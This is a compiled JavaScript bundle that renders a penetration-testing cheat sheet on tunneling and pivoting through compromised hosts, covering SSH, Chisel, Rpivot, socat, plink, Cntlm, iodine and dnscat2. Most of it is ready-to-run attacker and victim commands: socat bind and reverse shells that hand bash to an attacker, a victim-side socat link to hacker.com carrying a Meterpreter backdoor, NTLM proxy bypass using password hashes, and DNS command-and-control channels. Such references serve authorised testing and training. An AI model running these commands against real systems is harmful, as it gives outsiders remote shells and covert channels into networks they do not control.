(window.webpackJsonp=window.webpackJsonp||[]).push([[106],{375:function(t,e,r){"use strict";r.r(e);var o=r(14),v=Object(o.a)({},(function(){var t=this,e=t._self._c;return e("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[e("p",[t._v("https://hacksheets.in/all-categories/network-main/tunneling-and-port-forwarding/")]),t._v(" "),e("h1",{attrs:{id:"ssh"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#ssh"}},[t._v("#")]),t._v(" "),e("strong",[t._v("SSH")]),e("ins")]),t._v(" "),e("p",[t._v("SSH graphical connection (X)")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1")]),t._v(" "),e("td",[e("code",[t._v("ssh")]),t._v(" "),e("code",[t._v("-Y -C <user>@<ip>")]),t._v(" "),e("code",[t._v("#-Y is less secure but faster than -X")])])])])]),t._v(" "),e("h2",{attrs:{id:"local-port2port"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#local-port2port"}},[t._v("#")]),t._v(" Local Port2Port"),e("ins")]),t._v(" "),e("p",[t._v("Open new Port in SSH Server –> Other port")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1")]),t._v(" "),e("td",[e("code",[t._v("ssh")]),t._v(" "),e("code",[t._v("-R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1")]),t._v(" "),e("code",[t._v("#Local port 1521 accessible in port 10521 from everywhere")])])])])]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1")]),t._v(" "),e("td",[e("code",[t._v("ssh")]),t._v(" "),e("code",[t._v("-R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1")]),t._v(" "),e("code",[t._v("#Remote port 1521 accessible in port 10521 from everywhere")])])])])]),t._v(" "),e("h2",{attrs:{id:"port2port"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#port2port"}},[t._v("#")]),t._v(" Port2Port"),e("ins")]),t._v(" "),e("p",[t._v("Local port –> Compromised host (SSH) –> Third_box:Port")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2"),e("br"),e("br"),t._v("3")]),t._v(" "),e("td",[e("code",[t._v("ssh")]),t._v(" "),e("code",[t._v("-i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]")]),t._v(" "),e("code",[t._v("#This way the terminal is still in your host")]),e("br"),e("br"),e("code",[t._v("#Example")]),e("br"),e("br"),e("code",[t._v("sudo")]),t._v(" "),e("code",[t._v("ssh")]),t._v(" "),e("code",[t._v("-L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>")])])])])]),t._v(" "),e("h2",{attrs:{id:"port2hostnet-proxychains"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#port2hostnet-proxychains"}},[t._v("#")]),t._v(" Port2hostnet (proxychains)"),e("ins")]),t._v(" "),e("p",[t._v("Local Port –> Compromised host(SSH) –> Wherever")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1")]),t._v(" "),e("td",[e("code",[t._v("ssh")]),t._v(" "),e("code",[t._v("-f -N -D <attacker_port> <username>@<ip_compromised>")]),t._v(" "),e("code",[t._v("#All sent to local port will exit through the compromised server (use as proxy)")])])])])]),t._v(" "),e("h2",{attrs:{id:"vpn-tunnel"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#vpn-tunnel"}},[t._v("#")]),t._v(" VPN-Tunnel"),e("ins")]),t._v(" "),e("p",[t._v("You need  "),e("strong",[t._v("root in both devices")]),t._v("  (as you are going to create new interfaces) and the sshd config has to allow root login:  "),e("code",[t._v("PermitRootLogin yes")]),t._v(" "),e("code",[t._v("PermitTunnel yes")])]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2"),e("br"),e("br"),t._v("3")]),t._v(" "),e("td",[e("code",[t._v("ssh")]),t._v(" "),e("code",[t._v("username@server -w any:any")]),t._v(" "),e("code",[t._v("#This wil create Tun interfaces in both devices")]),e("br"),e("br"),e("code",[t._v("ip addr add 1.1.1.2``/32")]),t._v(" "),e("code",[t._v("peer 1.1.1.1 dev tun0")]),t._v(" "),e("code",[t._v("#Client side VPN IP")]),e("br"),e("br"),e("code",[t._v("ip addr add 1.1.1.1``/32")]),t._v(" "),e("code",[t._v("peer 1.1.1.2 dev tun0")]),t._v(" "),e("code",[t._v("#Server side VPN IP")])])])])]),t._v(" "),e("p",[t._v("Enable forwarding in Server side")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2")]),t._v(" "),e("td",[e("code",[t._v("echo")]),t._v(" "),e("code",[t._v("1 >")]),t._v(" "),e("code",[t._v("/proc/sys/net/ipv4/ip_forward")]),e("br"),e("br"),e("code",[t._v("iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE")])])])])]),t._v(" "),e("p",[t._v("Set new route on client side")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1")]),t._v(" "),e("td",[e("code",[t._v("route add -net 10.0.0.0``/16")]),t._v(" "),e("code",[t._v("gw 1.1.1.1")])])])])]),t._v(" "),e("h1",{attrs:{id:"sshuttle"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#sshuttle"}},[t._v("#")]),t._v(" SSHUTTLE"),e("ins")]),t._v(" "),e("p",[t._v("You can  "),e("strong",[t._v("tunnel")]),t._v("  via  "),e("strong",[t._v("ssh")]),t._v("  all the  "),e("strong",[t._v("traffic")]),t._v("  to a  "),e("strong",[t._v("subnetwork")]),t._v("  through a host. Example, forwarding all the traffic going to 10.10.10.0/24")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2")]),t._v(" "),e("td",[e("code",[t._v("pip")]),t._v(" "),e("code",[t._v("install")]),t._v(" "),e("code",[t._v("sshuttle")]),e("br"),e("br"),e("code",[t._v("sshuttle -r user@host 10.10.10.10``/24")])])])])]),t._v(" "),e("h1",{attrs:{id:"meterpreter"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#meterpreter"}},[t._v("#")]),t._v(" Meterpreter"),e("ins")]),t._v(" "),e("h2",{attrs:{id:"port2port-2"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#port2port-2"}},[t._v("#")]),t._v(" Port2Port"),e("ins")]),t._v(" "),e("p",[t._v("Local port –> Compromised host (active session) –> Third_box:Port")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2")]),t._v(" "),e("td",[e("code",[t._v("# Inside a meterpreter session")]),e("br"),e("br"),e("code",[t._v("portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>")])])])])]),t._v(" "),e("h2",{attrs:{id:"port2hostnet-proxychains-2"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#port2hostnet-proxychains-2"}},[t._v("#")]),t._v(" Port2hostnet (proxychains)"),e("ins")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2"),e("br"),e("br"),t._v("3"),e("br"),e("br"),t._v("4"),e("br"),e("br"),t._v("5")]),t._v(" "),e("td",[e("code",[t._v("background``# meterpreter session")]),e("br"),e("br"),e("code",[t._v("route add <IP_victim> <Netmask> <Session>")]),t._v(" "),e("code",[t._v("# (ex: route add 10.10.10.14 255.255.255.0 8)")]),e("br"),e("br"),e("code",[t._v("use auxiliary``/server/socks_proxy")]),e("br"),e("br"),e("code",[t._v("run")]),t._v(" "),e("code",[t._v("#Proxy port 1080 by default")]),e("br"),e("br"),e("code",[t._v("echo")]),t._v(" "),e("code",[t._v('"socks4 127.0.0.1 1080"')]),t._v(" "),e("code",[t._v(">")]),t._v(" "),e("code",[t._v("/etc/proxychains``.conf")]),t._v(" "),e("code",[t._v("#Proxychains")])])])])]),t._v(" "),e("p",[t._v("Another way:")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2"),e("br"),e("br"),t._v("3"),e("br"),e("br"),t._v("4"),e("br"),e("br"),t._v("5"),e("br"),e("br"),t._v("6"),e("br"),e("br"),t._v("7"),e("br"),e("br"),t._v("8"),e("br"),e("br"),t._v("9"),e("br"),e("br"),t._v("10")]),t._v(" "),e("td",[e("code",[t._v("background")]),t._v(" "),e("code",[t._v("#meterpreter session")]),e("br"),e("br"),e("code",[t._v("use post``/multi/manage/autoroute")]),e("br"),e("br"),e("code",[t._v("set")]),t._v(" "),e("code",[t._v("SESSION <session_n>")]),e("br"),e("br"),e("code",[t._v("set")]),t._v(" "),e("code",[t._v("SUBNET <New_net_ip>")]),t._v(" "),e("code",[t._v("#Ex: set SUBNET 10.1.13.0")]),e("br"),e("br"),e("code",[t._v("set")]),t._v(" "),e("code",[t._v("NETMASK <Netmask>")]),e("br"),e("br"),e("code",[t._v("run")]),e("br"),e("br"),e("code",[t._v("use auxiliary``/server/socks_proxy")]),e("br"),e("br"),e("code",[t._v("set")]),t._v(" "),e("code",[t._v("VERSION 4a")]),e("br"),e("br"),e("code",[t._v("run")]),t._v(" "),e("code",[t._v("#Proxy port 1080 by default")]),e("br"),e("br"),e("code",[t._v("echo")]),t._v(" "),e("code",[t._v('"socks4 127.0.0.1 1080"')]),t._v(" "),e("code",[t._v(">")]),t._v(" "),e("code",[t._v("/etc/proxychains``.conf")]),t._v(" "),e("code",[t._v("#Proxychains")])])])])]),t._v(" "),e("h1",{attrs:{id:"regeorg"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#regeorg"}},[t._v("#")]),t._v(" reGeorg"),e("ins")]),t._v(" "),e("p",[e("ins",[t._v("https://github.com/sensepost/reGeorg")])]),t._v(" "),e("p",[t._v("You need to upload a web file tunnel: ashx|aspx|js|jsp|php|php|jsp")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1")]),t._v(" "),e("td",[e("code",[t._v("python reGeorgSocksProxy.py -p 8080 -u http:``//upload``.sensepost.net:8080``/tunnel/tunnel``.jsp")])])])])]),t._v(" "),e("h1",{attrs:{id:"chisel"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#chisel"}},[t._v("#")]),t._v(" Chisel"),e("ins")]),t._v(" "),e("p",[t._v("You can download it from the releases page of  "),e("ins",[t._v("https://github.com/jpillora/chisel")]),t._v("  You need to use the  "),e("strong",[t._v("same version for client and server")])]),t._v(" "),e("h2",{attrs:{id:"socks"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#socks"}},[t._v("#")]),t._v(" socks"),e("ins")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2"),e("br"),e("br"),t._v("3")]),t._v(" "),e("td",[e("code",[t._v(".``/chisel")]),t._v(" "),e("code",[t._v("server -p 8080 --reverse")]),t._v(" "),e("code",[t._v("#Server")]),e("br"),e("br"),e("code",[t._v(".``/chisel-x64``.exe client 10.10.14.3:8080 R:socks")]),t._v(" "),e("code",[t._v("#Client")]),e("br"),e("br"),e("code",[t._v("#And now you can use proxychains with port 1080 (default)")])])])])]),t._v(" "),e("h2",{attrs:{id:"port-forwarding"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#port-forwarding"}},[t._v("#")]),t._v(" Port forwarding"),e("ins")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2")]),t._v(" "),e("td",[e("code",[t._v(".``/chisel_1``.7.6_linux_amd64 server -p 12312 --reverse")]),e("br"),e("br"),e("code",[t._v(".``/chisel_1``.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505")])])])])]),t._v(" "),e("h1",{attrs:{id:"rpivot"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#rpivot"}},[t._v("#")]),t._v(" Rpivot"),e("ins")]),t._v(" "),e("p",[e("ins",[t._v("https://github.com/klsecservices/rpivot")])]),t._v(" "),e("p",[t._v("Reverse tunnel. The tunnel is started from the victim. A socks4 proxy is created on 127.0.0.1:1080")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1")]),t._v(" "),e("td",[e("code",[t._v("attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080")])])])])]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1")]),t._v(" "),e("td",[e("code",[t._v("victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999")])])])])]),t._v(" "),e("p",[t._v("Pivot through  "),e("strong",[t._v("NTLM proxy")])]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1")]),t._v(" "),e("td",[e("code",[t._v("victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd")])])])])]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1")]),t._v(" "),e("td",[e("code",[t._v("victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45")])])])])]),t._v(" "),e("h1",{attrs:{id:"socat"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#socat"}},[t._v("#")]),t._v(" "),e("strong",[t._v("Socat")]),e("ins")]),t._v(" "),e("p",[e("ins",[t._v("https://github.com/andrew-d/static-binaries")])]),t._v(" "),e("h2",{attrs:{id:"bind-shell"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#bind-shell"}},[t._v("#")]),t._v(" Bind shell"),e("ins")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2")]),t._v(" "),e("td",[e("code",[t._v("victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:``bash``,pty,stderr,setsid,sigint,sane")]),e("br"),e("br"),e("code",[t._v("attacker> socat FILE:` ```tty``` `,raw,```echo")]),t._v("=0 TCP:<victim_ip>:1337`")])])])]),t._v(" "),e("h2",{attrs:{id:"reverse-shell"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#reverse-shell"}},[t._v("#")]),t._v(" Reverse shell"),e("ins")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2")]),t._v(" "),e("td",[e("code",[t._v("attacker> socat TCP-LISTEN:1337,reuseaddr FILE:` ```tty``` `,raw,```echo")]),t._v("=0"),e("code",[t._v("<br><br>")]),t._v("victim> socat TCP4:<attackers_ip>:1337 EXEC:"),e("code",[t._v("bash")]),t._v(",pty,stderr,setsid,sigint,sane`")])])])]),t._v(" "),e("h2",{attrs:{id:"port2port-3"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#port2port-3"}},[t._v("#")]),t._v(" Port2Port"),e("ins")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1")]),t._v(" "),e("td",[e("code",[t._v("socat TCP-LISTEN:<lport>,fork TCP:<redirect_ip>:<rport> &")])])])])]),t._v(" "),e("h2",{attrs:{id:"port2port-through-socks"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#port2port-through-socks"}},[t._v("#")]),t._v(" Port2Port through socks"),e("ins")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1")]),t._v(" "),e("td",[e("code",[t._v("socat TCP-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678")])])])])]),t._v(" "),e("h2",{attrs:{id:"meterpreter-through-ssl-socat"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#meterpreter-through-ssl-socat"}},[t._v("#")]),t._v(" Meterpreter through SSL Socat"),e("ins")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2")]),t._v(" "),e("td",[e("code",[t._v("#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port")]),e("br"),e("br"),e("code",[t._v("attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333")])])])])]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2")]),t._v(" "),e("td",[e("code",[t._v("victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5\\|TCP:hacker.com:443,connect-timeout=5")]),e("br"),e("br"),e("code",[t._v("#Execute the meterpreter")])])])])]),t._v(" "),e("p",[t._v("You can bypass a  "),e("strong",[t._v("non-authenticated proxy")]),t._v("  executing this line instead of the last one in the victim’s console:")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1")]),t._v(" "),e("td",[e("code",[t._v("OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5\\|PROXY:hacker.com:443,connect-timeout=5\\|TCP:proxy.lan:8080,connect-timeout=5")])])])])]),t._v(" "),e("p",[e("ins",[t._v("https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/")])]),t._v(" "),e("h2",{attrs:{id:"ssl-socat-tunnel"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#ssl-socat-tunnel"}},[t._v("#")]),t._v(" SSL Socat Tunnel"),e("ins")]),t._v(" "),e("p",[e("strong",[t._v("/bin/sh console")])]),t._v(" "),e("p",[t._v("Create certificates in both sides: Client and Server")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2"),e("br"),e("br"),t._v("3"),e("br"),e("br"),t._v("4"),e("br"),e("br"),t._v("5"),e("br"),e("br"),t._v("6")]),t._v(" "),e("td",[e("code",[t._v("# Execute this commands in both sides")]),e("br"),e("br"),e("code",[t._v("FILENAME=socatssl")]),e("br"),e("br"),e("code",[t._v("openssl genrsa -out $FILENAME.key 1024")]),e("br"),e("br"),e("code",[t._v("openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt")]),e("br"),e("br"),e("code",[t._v("cat")]),t._v(" "),e("code",[t._v("$FILENAME.key $FILENAME.crt >$FILENAME.pem")]),e("br"),e("br"),e("code",[t._v("chmod")]),t._v(" "),e("code",[t._v("600 $FILENAME.key $FILENAME.pem")])])])])]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2")]),t._v(" "),e("td",[e("code",[t._v("attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:``/bin/sh")]),e("br"),e("br"),e("code",[t._v("victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt")])])])])]),t._v(" "),e("h2",{attrs:{id:"remote-port2port"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#remote-port2port"}},[t._v("#")]),t._v(" Remote Port2Port"),e("ins")]),t._v(" "),e("p",[t._v("Connect the local SSH port (22) to the 443 port of the attacker host")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2"),e("br"),e("br"),t._v("3")]),t._v(" "),e("td",[e("code",[t._v("attacker>")]),t._v(" "),e("code",[t._v("sudo")]),t._v(" "),e("code",[t._v("socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr")]),t._v(" "),e("code",[t._v("#Redirect port 2222 to port 443 in localhost")]),e("br"),e("br"),e("code",[t._v("victim>")]),t._v(" "),e("code",[t._v("while")]),t._v(" "),e("code",[t._v("true``;")]),t._v(" "),e("code",[t._v("do")]),t._v(" "),e("code",[t._v("socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ;")]),t._v(" "),e("code",[t._v("done")]),t._v(" "),e("code",[t._v("# Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22")]),e("br"),e("br"),e("code",[t._v("attacker>")]),t._v(" "),e("code",[t._v("ssh")]),t._v(" "),e("code",[t._v("localhost -p 2222 -l www-data -i vulnerable")]),t._v(" "),e("code",[t._v("#Connects to the ssh of the victim")])])])])]),t._v(" "),e("h1",{attrs:{id:"plink-exe"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#plink-exe"}},[t._v("#")]),t._v(" Plink.exe"),e("ins")]),t._v(" "),e("p",[t._v("It’s like a console PuTTY version ( the options are very similar to a ssh client).")]),t._v(" "),e("p",[t._v("As this binary will be executed in the victim and it is a ssh client, we need to open our ssh service and port so we can have a reverse connection. Then, to forward a only locally accessible port to a port in our machine:")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2")]),t._v(" "),e("td",[e("code",[t._v("echo")]),t._v(" "),e("code",[t._v("y \\| plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>")]),e("br"),e("br"),e("code",[t._v("echo")]),t._v(" "),e("code",[t._v("y \\| plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41")]),t._v(" "),e("code",[t._v("#Local port 9090 to out port 9090")])])])])]),t._v(" "),e("h1",{attrs:{id:"ntlm-proxy-bypass"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#ntlm-proxy-bypass"}},[t._v("#")]),t._v(" NTLM proxy bypass"),e("ins")]),t._v(" "),e("p",[t._v("The previously mentioned tool:  "),e("strong",[t._v("Rpivot")]),t._v(" "),e("strong",[t._v("OpenVPN")]),t._v("  can also bypass it, setting these options in the configuration file:")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1")]),t._v(" "),e("td",[e("code",[t._v("http-proxy <proxy_ip> 8080 <file_with_creds> ntlm")])])])])]),t._v(" "),e("h2",{attrs:{id:"cntlm"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#cntlm"}},[t._v("#")]),t._v(" Cntlm"),e("ins")]),t._v(" "),e("p",[e("ins",[t._v("http://cntlm.sourceforge.net/")])]),t._v(" "),e("p",[t._v("It authenticates against a proxy and binds a port locally that is forwarded to the external service you specify. Then, you can use the tool of your choice through this port. Example that forward port 443")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2"),e("br"),e("br"),t._v("3"),e("br"),e("br"),t._v("4"),e("br"),e("br"),t._v("5")]),t._v(" "),e("td",[e("code",[t._v("Username Alice")]),e("br"),e("br"),e("code",[t._v("Password P@ssw0rd")]),e("br"),e("br"),e("code",[t._v("Domain CONTOSO.COM")]),e("br"),e("br"),e("code",[t._v("Proxy 10.0.0.10:8080")]),e("br"),e("br"),e("code",[t._v("Tunnel 2222:<attackers_machine>:443")])])])])]),t._v(" "),e("p",[t._v("Now, if you set for example in the victim the  "),e("strong",[t._v("SSH")]),t._v("  service to listen in port 443. You can connect to it through the attacker port 2222. You could also use a  "),e("strong",[t._v("meterpreter")]),t._v("  that connects to localhost:443 and the attacker is listening in port 2222.")]),t._v(" "),e("h1",{attrs:{id:"yarp"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#yarp"}},[t._v("#")]),t._v(" YARP"),e("ins")]),t._v(" "),e("p",[t._v("A reverse proxy create by Microsoft. You can find it here:  "),e("ins",[t._v("https://github.com/microsoft/reverse-proxy")])]),t._v(" "),e("h1",{attrs:{id:"dns-tunneling"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#dns-tunneling"}},[t._v("#")]),t._v(" DNS Tunneling"),e("ins")]),t._v(" "),e("h2",{attrs:{id:"iodine"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#iodine"}},[t._v("#")]),t._v(" Iodine"),e("ins")]),t._v(" "),e("p",[e("ins",[t._v("https://code.kryo.se/iodine/")])]),t._v(" "),e("p",[t._v("Root is needed in both systems to create tun adapters and tunnels data between them using DNS queries.")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2"),e("br"),e("br"),t._v("3")]),t._v(" "),e("td",[e("code",[t._v("attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com")]),e("br"),e("br"),e("code",[t._v("victim> iodine -f -P P@ssw0rd tunneldomain.com -r")]),e("br"),e("br"),e("code",[t._v("#You can see the victim at 1.1.1.2")])])])])]),t._v(" "),e("p",[t._v("The tunnel will be really slow. You can create a compressed SSH connection through this tunnel by using:")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1")]),t._v(" "),e("td",[e("code",[t._v("ssh")]),t._v(" "),e("code",[t._v("<user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080")])])])])]),t._v(" "),e("h2",{attrs:{id:"dnscat2"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#dnscat2"}},[t._v("#")]),t._v(" DNSCat2"),e("ins")]),t._v(" "),e("p",[t._v("Establishes a C&C channel through DNS. It doesn’t need root privileges.")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2")]),t._v(" "),e("td",[e("code",[t._v("attacker> ruby .``/dnscat2``.rb tunneldomain.com")]),e("br"),e("br"),e("code",[t._v("victim> .``/dnscat2")]),t._v(" "),e("code",[t._v("tunneldomain.com")])])])])]),t._v(" "),e("p",[e("strong",[t._v("Port forwarding with dnscat")])]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2")]),t._v(" "),e("td",[e("code",[t._v("session -i <sessions_id>")]),e("br"),e("br"),e("code",[t._v("listen [lhost:]lport rhost:rport")]),t._v(" "),e("code",[t._v("#Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host")])])])])]),t._v(" "),e("h3",{attrs:{id:"change-proxychains-dns"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#change-proxychains-dns"}},[t._v("#")]),t._v(" Change proxychains DNS"),e("ins")]),t._v(" "),e("p",[t._v("Proxychains intercepts  "),e("code",[t._v("gethostbyname")]),t._v("  libc call and tunnels tcp DNS request through the socks proxy. By  "),e("strong",[t._v("default")]),t._v("  the  "),e("strong",[t._v("DNS")]),t._v("  server that proxychains use is  "),e("strong",[t._v("4.2.2.2")]),t._v("  (hardcoded). To change it, edit the file:  "),e("em",[t._v("/usr/lib/proxychains3/proxyresolv")]),t._v("  and change the IP. If you are in a  "),e("strong",[t._v("Windows environment")]),t._v("  you could set the IP of the  "),e("strong",[t._v("domain controller")]),t._v(".")]),t._v(" "),e("h1",{attrs:{id:"tunnels-in-go"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#tunnels-in-go"}},[t._v("#")]),t._v(" Tunnels in Go"),e("ins")]),t._v(" "),e("p",[e("ins",[t._v("https://github.com/hotnops/gtunnel")])]),t._v(" 